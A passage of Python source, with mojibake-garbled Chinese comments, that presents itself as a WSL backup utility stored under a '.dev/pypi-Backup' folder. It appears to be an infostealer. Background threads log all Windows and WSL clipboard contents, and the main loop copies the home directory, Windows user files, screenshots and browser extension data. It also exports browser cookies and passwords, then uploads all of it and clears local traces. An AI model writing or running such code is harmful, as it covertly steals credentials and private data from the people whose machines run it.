    """ç‹¬ç«‹çš„JTBä¸Šä¼ çº¿ç¨‹"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    while True:
        try:
            if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                # æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–åªåŒ…å«ä¸Šä¼ è®°å½•
                with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    # æ£€æŸ¥æ˜¯å¦åªåŒ…å«åˆå§‹åŒ–æ ‡è®°æˆ–ä¸Šä¼ è®°å½•
                    has_valid_content = False
                    lines = content.split('\n')
                    for line in lines:
                        line = line.strip()
                        if (line and 
                            not line.startswith('===') and 
                            not line.startswith('-') and
                            not 'JTBç›‘æ§å¯åŠ¨äº' in line and 
                            not 'æ—¥å¿—å·²äº' in line):
                            has_valid_content = True
                            break
                            
                    if not has_valid_content:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug("ğŸ“‹ JTBå†…å®¹ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                        continue

                # åˆ›å»ºä¸´æ—¶ç›®å½•
                username = getpass.getuser()
                user_prefix = username[:5] if username else "user"
                temp_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_temp_clipboard_logs"
                if backup_manager._ensure_directory(str(temp_dir)):
                    # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                    backup_path = temp_dir / backup_name
                    
                    # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
                    try:
                        shutil.copy2(clipboard_log_path, backup_path)
                        if backup_manager.config.DEBUG_MODE:
                            logging.info("ğŸ“„ å‡†å¤‡ä¸Šä¼ JTBæ—¥å¿—...")
                    except Exception as e:
                        logging.error(f"âŒ å¤åˆ¶JTBæ—¥å¿—å¤±è´¥: {e}")
                        continue
                    
                    # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
                    if backup_manager.upload_file(str(backup_path)):
                        # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶
                        try:
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== ğŸ“‹ æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼ å¹¶æ¸…ç©º ===\n")
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("âœ… JTBæ—¥å¿—å·²æ¸…ç©º")
                        except Exception as e:
                            logging.error(f"ğŸ§¹ JTBæ—¥å¿—æ¸…ç©ºå¤±è´¥: {e}")
                    else:
                        logging.error("âŒ JTBæ—¥å¿—ä¸Šä¼ å¤±è´¥")
                    
                    # æ¸…ç†ä¸´æ—¶ç›®å½•
                    try:
                        if os.path.exists(str(temp_dir)):
                            shutil.rmtree(str(temp_dir))
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.error(f"âŒ æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†JTBæ—¥å¿—æ—¶å‡ºé”™: {e}")
            
        # ç­‰å¾…20åˆ†é’Ÿ
        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)

def clean_backup_directory():
    """æ¸…ç†å¤‡ä»½ç›®å½•ï¼Œä½†ä¿ç•™æ—¥å¿—æ–‡ä»¶å’Œæ—¶é—´é˜ˆå€¼æ–‡ä»¶"""
    backup_dir = Path.home() / ".dev/pypi-Backup"
    try:
        if not os.path.exists(backup_dir):
            return
            
        # éœ€è¦ä¿ç•™çš„æ–‡ä»¶
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        keep_files = [
            "backup.log",           # å¤‡ä»½æ—¥å¿—
            f"{user_prefix}_clipboard_log.txt",    # JTBæ—¥å¿—
            "next_backup_time.txt"  # æ—¶é—´é˜ˆå€¼æ–‡ä»¶
        ]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"ğŸ—‘ï¸ å·²æ¸…ç†: {item}")
            except Exception as e:
                logging.error(f"âŒ æ¸…ç† {item} å¤±è´¥: {e}")
                
        logging.critical("ğŸ§¹ å¤‡ä»½ç›®å½•å·²æ¸…ç†å®Œæˆ")
    except Exception as e:
        logging.error(f"âŒ æ¸…ç†å¤‡ä»½ç›®å½•æ—¶å‡ºé”™: {e}")

def main():
    if not is_wsl():
        logging.critical("æœ¬è„šæœ¬ä»…é€‚ç”¨äº WSL ç¯å¢ƒ")
        return

    try:
        backup_manager = BackupManager()
        
        # å¯åŠ¨æ—¶æ¸…ç†å¤‡ä»½ç›®å½•
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\nå¤‡ä»½ç¨‹åºå·²åœæ­¢")
    except Exception as e:
        logging.critical(f"âŒç¨‹åºå‡ºé”™: {e}")

def periodic_backup_upload(backup_manager):
    """å®šæœŸæ‰§è¡Œå¤‡ä»½å’Œä¸Šä¼ """
    user = get_username()
    
    # WSLå¤‡ä»½è·¯å¾„
    wsl_source = str(Path.home())
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    wsl_target = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_wsl"
    clipboard_log_path = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_clipboard_log.txt"
    
    # å¯åŠ¨åŒå‘JTBç›‘æ§çº¿ç¨‹
    clipboard_both_thread = threading.Thread(
        target=monitor_clipboard_both,
        args=(backup_manager, clipboard_log_path, 3),
        daemon=True
    )
    clipboard_both_thread.start()
    
    # å¯åŠ¨JTBä¸Šä¼ çº¿ç¨‹
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    
    try:
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== ğŸ“‹ JTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error("âŒ åˆå§‹åŒ–JTBæ—¥å¿—å¤±è´¥")

    # è·å–ç”¨æˆ·åå’Œç³»ç»Ÿä¿¡æ¯
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # è·å–ç³»ç»Ÿç¯å¢ƒä¿¡æ¯
    system_info = {
        "æ“ä½œç³»ç»Ÿ": platform.system(),
        "ç³»ç»Ÿç‰ˆæœ¬": platform.release(),
        "ç³»ç»Ÿæ¶æ„": platform.machine(),
        "Pythonç‰ˆæœ¬": platform.python_version(),
        "ä¸»æœºå": hostname,
        "ç”¨æˆ·å": username,
    }
    
    # è·å–WSLè¯¦ç»†ä¿¡æ¯
    try:
        with open("/proc/version", "r") as f:
            wsl_version = f.read().strip()
            # æå–WSLç‰ˆæœ¬å·
            if "WSL2" in wsl_version or "microsoft-standard" in wsl_version.lower():
                system_info["WSLç‰ˆæœ¬"] = "WSL2"
            elif "Microsoft" in wsl_version:
                system_info["WSLç‰ˆæœ¬"] = "WSL1"
    except:
        system_info["WSLç‰ˆæœ¬"] = "æœªçŸ¥"
    
    # è·å–Linuxå‘è¡Œç‰ˆä¿¡æ¯
    try:
        with open("/etc/os-release", "r") as f:
            for line in f:
                if line.startswith("PRETTY_NAME="):
                    system_info["Linuxå‘è¡Œç‰ˆ"] = line.split("=")[1].strip().strip('"')
                    break
    except:
        pass
    
    # è¾“å‡ºå¯åŠ¨ä¿¡æ¯å’Œç³»ç»Ÿç¯å¢ƒ
    logging.critical("\n" + "="*50)
    logging.critical("ğŸš€ è‡ªåŠ¨å¤‡ä»½ç³»ç»Ÿå·²å¯åŠ¨")
    logging.critical("="*50)
    logging.critical(f"â° å¯åŠ¨æ—¶é—´: {current_time}")
    logging.critical("-"*50)
    logging.critical("ğŸ“Š ç³»ç»Ÿç¯å¢ƒä¿¡æ¯:")
    for key, value in system_info.items():
        logging.critical(f"   â€¢ {key}: {value}")
    logging.critical("-"*50)
    logging.critical("ğŸ“‹ JTBç›‘æ§å’Œè‡ªåŠ¨ä¸Šä¼ å·²å¯åŠ¨")
    logging.critical("="*50)

    while True:
        try:
            # æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
            should_backup, next_time = backup_manager.should_run_backup()
            
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if not should_backup:
                next_time_str = next_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"\nâ³ å½“å‰æ—¶é—´: {current_time}")
                logging.critical(f"âŒ› ä¸‹æ¬¡å¤‡ä»½: {next_time_str}")
            else:
                logging.critical("\n" + "="*40)
                logging.critical(f"â° å¼€å§‹å¤‡ä»½  {current_time}")
                logging.critical("-"*40)
                
                # æ‰§è¡Œå¤‡ä»½ä»»åŠ¡
                logging.critical("\nğŸ§ WSLå¤‡ä»½")
                wsl_backup_paths = backup_wsl(backup_manager, wsl_source, wsl_target) or []
                
                logging.critical("\nğŸªŸ Windowsæ•°æ®å¤‡ä»½")
                windows_data_backup_paths = backup_windows_data(backup_manager, user)
                
                # åˆå¹¶æ‰€æœ‰å¤‡ä»½è·¯å¾„
                all_backup_paths = wsl_backup_paths + windows_data_backup_paths
                
                # ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
                next_backup_time = backup_manager.save_next_backup_time()
                
                # è¾“å‡ºç»“æŸè¯­ï¼ˆåœ¨ä¸Šä¼ ä¹‹å‰ï¼‰
                has_backup_files = len(all_backup_paths) > 0
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "æœªçŸ¥"
                
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"âœ… å¤‡ä»½å®Œæˆ  {current_time}")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_time_str}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("âŒ éƒ¨åˆ†å¤‡ä»½ä»»åŠ¡å¤±è´¥")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_time_str}")
                    logging.critical("="*40 + "\n")
                
                # å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
                if all_backup_paths:
                    logging.critical("ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("âœ… æ‰€æœ‰å¤‡ä»½æ–‡ä»¶ä¸Šä¼ æˆåŠŸ")
                    else:
                        logging.error("âŒ éƒ¨åˆ†å¤‡ä»½æ–‡ä»¶ä¸Šä¼ å¤±è´¥")
                
                # ä¸Šä¼ å¤‡ä»½æ—¥å¿—
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\nğŸ“ å¤‡ä»½æ—¥å¿—ä¸Šä¼ ")
                backup_and_upload_logs(backup_manager)

            # æ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡
            time.sleep(3600)

        except Exception as e:
            logging.error(f"\nâŒ å¤‡ä»½å‡ºé”™: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error("âŒ æ—¥å¿—å¤‡ä»½å¤±è´¥")
            time.sleep(60)  # å‡ºé”™åç­‰å¾…1åˆ†é’Ÿå†é‡è¯•

def backup_wsl(backup_manager, source, target):
    """å¤‡ä»½WSLç›®å½•ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰"""
    backup_dir = backup_manager.backup_wsl_files(source, target)
    if backup_dir:
        backup_path = backup_manager.zip_backup_folder(
            backup_dir, 
            str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            logging.critical("â˜‘ï¸ WSLç›®å½•å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ")
            return backup_path if isinstance(backup_path, list) else [backup_path]
        else:
            logging.error("âŒ WSLç›®å½•å‹ç¼©å¤±è´¥")
            return None
    return None


def backup_windows_data(backup_manager, user):
    """å¤‡ä»½Windowsç‰¹å®šæ•°æ®ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰"""
    backup_paths = []
    
    # ç›´æ¥å¤åˆ¶æŒ‡å®šçš„ Windows ç›®å½•å’Œæ–‡ä»¶ï¼ˆæ¡Œé¢ã€ä¾¿ç­¾ã€å†å²è®°å½•ç­‰ï¼‰
    user_prefix = user[:5] if user else "user"
    windows_base_path = f"/mnt/c/Users/{user}"
    specified_backup_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_windows_specified"
    
    if os.path.exists(windows_base_path):
        if backup_manager._ensure_directory(str(specified_backup_dir)):
            files_count = 0
            total_size = 0
            
            for item in backup_manager.config.WINDOWS_SPECIFIC_PATHS:
                source_path = os.path.join(windows_base_path, item)
                if not os.path.exists(source_path):
                    if backup_manager.config.DEBUG_MODE:
                        logging.debug(f"è·³è¿‡ä¸å­˜åœ¨çš„é¡¹ç›®: {source_path}")
                    continue
                
                try:
                    if os.path.isdir(source_path):
                        # å¤åˆ¶ç›®å½•
                        target_path = os.path.join(specified_backup_dir, item)
                        parent_dir = os.path.dirname(target_path)
                        if backup_manager._ensure_directory(parent_dir):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path, ignore_errors=True)
                            shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                            dir_size = backup_manager._get_dir_size(target_path)
                            files_count += 1
                            total_size += dir_size
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug(f"æˆåŠŸå¤åˆ¶ç›®å½•: {item}")
                    else:
                        # å¤åˆ¶æ–‡ä»¶
                        target_path = os.path.join(specified_backup_dir, item)
                        parent_dir = os.path.dirname(target_path)
                        if backup_manager._ensure_directory(parent_dir):
                            shutil.copy2(source_path, target_path)
                            file_size = os.path.getsize(target_path)
                            files_count += 1
                            total_size += file_size
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug(f"æˆåŠŸå¤åˆ¶æ–‡ä»¶: {item}")
                except Exception as e:
                    if backup_manager.config.DEBUG_MODE:
                        logging.debug(f"å¤åˆ¶å¤±è´¥: {item} - {str(e)}")
            
            if files_count > 0:
                logging.info(f"\nğŸ“Š WindowsæŒ‡å®šæ–‡ä»¶å¤‡ä»½å®Œæˆ:")
                logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
                logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
                
                backup_path = backup_manager.zip_backup_folder(
                    str(specified_backup_dir),
                    str(Path.home() / f".dev/pypi-Backup/{user_prefix}_wsl_wins_specified_") + datetime.now().strftime("%Y%m%d_%H%M%S")
                )
                if backup_path:
                    if isinstance(backup_path, list):
                        backup_paths.extend(backup_path)
                    else:
                        backup_paths.append(backup_path)
                    logging.critical("â˜‘ï¸ WindowsæŒ‡å®šç›®å½•å’Œæ–‡ä»¶å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
                else:
                    logging.error("âŒ WindowsæŒ‡å®šç›®å½•å’Œæ–‡ä»¶å‹ç¼©å¤±è´¥\n")
            else:
                logging.error("âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„WindowsæŒ‡å®šæ–‡ä»¶")
    
    # å¤‡ä»½æˆªå›¾
    screenshots_backup = backup_screenshots(user)
    if screenshots_backup:
        backup_path = backup_manager.zip_backup_folder(
            screenshots_backup,
            str(Path.home() / f".dev/pypi-Backup/{user_prefix}_screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("â˜‘ï¸ æˆªå›¾æ–‡ä»¶å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
    else:
        logging.info("â„¹ï¸ æœªå‘ç°å¯å¤‡ä»½çš„æˆªå›¾æ–‡ä»¶\n")

    # å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®
    extensions_backup = backup_browser_extensions(backup_manager, user)
    if extensions_backup:
        backup_path = backup_manager.zip_backup_folder(
            extensions_backup,
            str(Path.home() / f".dev/pypi-Backup/{user_prefix}_browser_extensions_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("â˜‘ï¸ æµè§ˆå™¨æ‰©å±•æ•°æ®å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
    
    # å¯¼å‡ºæµè§ˆå™¨ Cookies å’Œå¯†ç 
    browser_export_file = export_browser_cookies_passwords_wsl(backup_manager, user)
    if browser_export_file:
        backup_paths.append(browser_export_file)
        logging.critical("â˜‘ï¸ æµè§ˆå™¨æ•°æ®å¯¼å‡ºæ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
    else:
        logging.warning("â­ï¸  æµè§ˆå™¨æ•°æ®å¯¼å‡ºè·³è¿‡æˆ–å¤±è´¥\n")
    
    return backup_paths

def get_wsl_clipboard():
    """è·å–WSL/Linux JTBå†…å®¹ï¼ˆä½¿ç”¨xclipï¼‰"""
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return None
    except Exception:
        return None

def set_wsl_clipboard(content):
    """è®¾ç½®WSL/Linux JTBå†…å®¹ï¼ˆä½¿ç”¨xclipï¼‰"""
    try:
        p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-i'], stdin=subprocess.PIPE)
        p.communicate(input=content.encode('utf-8'))
        return p.returncode == 0
    except Exception:
        return False

def set_windows_clipboard(content):
    """è®¾ç½®Windows JTBå†…å®¹ï¼ˆé€šè¿‡powershellï¼‰"""
    try:
        if content is None:
            return False

        # å®¹å¿ bytes è¾“å…¥ï¼Œç»Ÿä¸€è½¬ä¸º strï¼Œé¿å…ç¼–ç å¼‚å¸¸
        if isinstance(content, bytes):
            content = content.decode("utf-8", errors="ignore")

        if not content:
            return False

        # ä½¿ç”¨ Base64 ä¼ é€’æ–‡æœ¬ï¼Œé¿å…è½¬ä¹‰/æ¢è¡Œ/ç‰¹æ®Šå­—ç¬¦å¯¼è‡´ PowerShell è§£æé”™è¯¯
        b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
        ps_script = (
            "$b64='{b64}';"
            "$bytes=[Convert]::FromBase64String($b64);"
            "$text=[System.Text.Encoding]::UTF8.GetString($bytes);"
            "Set-Clipboard -Value $text"
        ).format(b64=b64)

        # ä½¿ç”¨å‚æ•°åˆ—è¡¨é¿å… shell è§£æé—®é¢˜ï¼Œä¸”ä¿æŒå­—èŠ‚æ¨¡å¼é˜²æ­¢ç¼–ç å¼‚å¸¸
        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-Command",
                ps_script,
            ],
            capture_output=True,
            text=False,
        )

        if result.returncode != 0:
            raw = result.stderr or result.stdout or b""
            error_msg = raw.decode("utf-8", errors="ignore").strip() if raw else "unknown error"
            logging.error(f"âŒ è®¾ç½®Windows JTBå¤±è´¥: {error_msg}")
            return False

        return True
    except Exception as e:
        logging.error(f"âŒ è®¾ç½®Windows JTBå‡ºé”™: {e}")
        return False

def monitor_clipboard_both(backup_manager, file_path, interval=3):
    """åŒå‘ç›‘æ§WSLå’ŒWindows JTBå¹¶è®°å½•/åŒæ­¥"""
    last_win_clip = ""
    last_wsl_clip = ""
    def is_special_content(text):
        if not text:
            return False
        if text.startswith('===') or text.startswith('-'):
            return True
        if 'JTBç›‘æ§å¯åŠ¨äº' in text or 'æ—¥å¿—å·²äº' in text:
            return True
        return False
    while True:
        try:
            win_clip = backup_manager.get_clipboard_content()  # Windows
            wsl_clip = get_wsl_clipboard()  # WSL

            if win_clip and not win_clip.isspace() and not is_special_content(win_clip):
                if win_clip != last_win_clip:
                    backup_manager.log_clipboard_update("[Windows] " + win_clip, file_path)
                    # åŒæ­¥åˆ°WSL
                    set_wsl_clipboard(win_clip)
                    last_win_clip = win_clip

            if wsl_clip and not wsl_clip.isspace() and not is_special_content(wsl_clip):
                if wsl_clip != last_wsl_clip:
                    backup_manager.log_clipboard_update("[WSL] " + wsl_clip, file_path)
                    # åŒæ­¥åˆ°Windows
                    set_windows_clipboard(wsl_clip)
                    last_wsl_clip = wsl_clip
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"âŒ JTBåŒå‘ç›‘æ§å‡ºé”™: {str(e)}")
        time.sleep(interval)

if __name__ == "__main__":
    main()